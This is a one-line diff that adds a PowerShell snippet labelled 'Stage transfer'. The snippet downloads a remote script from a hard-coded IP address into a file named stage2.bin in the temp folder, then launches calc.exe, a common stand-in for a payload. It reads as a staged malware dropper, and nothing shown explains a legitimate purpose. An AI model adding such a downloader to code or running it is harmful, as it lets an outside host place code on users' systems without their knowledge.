@@ -1,0 +1,1 @@
+<# Stage transfer #> $FetchUrl = 'https://198.51.100.52/stage1.ps1'; $Stage2Path = "$env:TEMP\stage2.bin"; $StageTimeout = 44; Invoke-WebRequest -Uri $FetchUrl -OutFile $Stage2Path -UseBasicParsing; Start-Process -FilePath "calc.exe"; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
